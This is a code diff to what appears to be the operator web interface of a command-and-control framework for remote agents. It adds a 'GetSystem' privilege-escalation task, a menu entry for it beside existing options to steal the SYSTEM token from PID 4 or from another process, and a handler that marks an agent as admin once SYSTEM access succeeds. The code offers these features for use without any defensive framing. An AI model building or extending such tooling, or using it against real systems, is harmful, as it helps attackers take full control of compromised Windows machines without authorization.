@@ -3821,7 +3821,14 @@ async function runCtxAction(act) {
       const aid = act.id || activeAgent?.id;
       if (!aid) break;
       const privAct = act.act;
-      if (privAct === 'steal-system') {
+      if (privAct === 'getsystem') {
+        const r = await api('POST', `/api/agents/${aid}/task`, {type:'GETSYSTEM', args:''});
+        if (r?.ok) {
+          toast('⚡ getsystem enviado — esperando resultado…');
+          if (!activeAgent || activeAgent.id !== aid) openConsoleFor(aid);
+          pollResult(r.data?.task_id, aid);
+        }
+      } else if (privAct === 'steal-system') {
         // Steal token from System (PID 4) — always works if SYSTEM
         const r = await api('POST', `/api/agents/${aid}/task`, {type:'TOKEN_STEAL', args:'4'});
         if (r?.ok) {
@@ -4422,6 +4429,7 @@ function agentContextMenu(e, agentId) {
     ]},
     {_sub:'🔐  Privilege Escalation', items:[
       {label:'🚀 Spawn Agent as User…',     action:{fn:'quickPrivesc', id, act:'spawn-as-user'}},
+      {label:'⚡ GetSystem',               action:{fn:'quickPrivesc', id, act:'getsystem'}},
       null,
       {label:'Steal SYSTEM token (PID 4)',  action:{fn:'quickPrivesc', id, act:'steal-system'}},
       {label:'Steal token from PID…',      action:{fn:'quickPrivesc', id, act:'steal-pid'}},
@@ -4862,6 +4870,14 @@ function handleSSE(ev) {
   } else if (ev.type === 'CHAT') {
     appendChatMsg({sender: ev.sender, message: ev.msg, ts: new Date().toISOString(), id: ev.task_id});
     if (!isChatVisible()) updateBadge('chat');
+  } else if (ev.type === 'AGENT_ADMIN') {
+    // getsystem succeeded — mark agent as admin and refresh views so icon turns red
+    if (ev.agent_id) {
+      const a = agents.find(a => a.id === ev.agent_id);
+      if (a) { a.is_admin = true; }
+      toast('⚡ SYSTEM — ' + (ev.agent_id||'').substring(0,8), 'green');
+      refreshAgents();
+    }
   } else if (ev.type === 'BH_IMPORT_PROMPT') {
     bhShowImportPrompt(ev);
   }
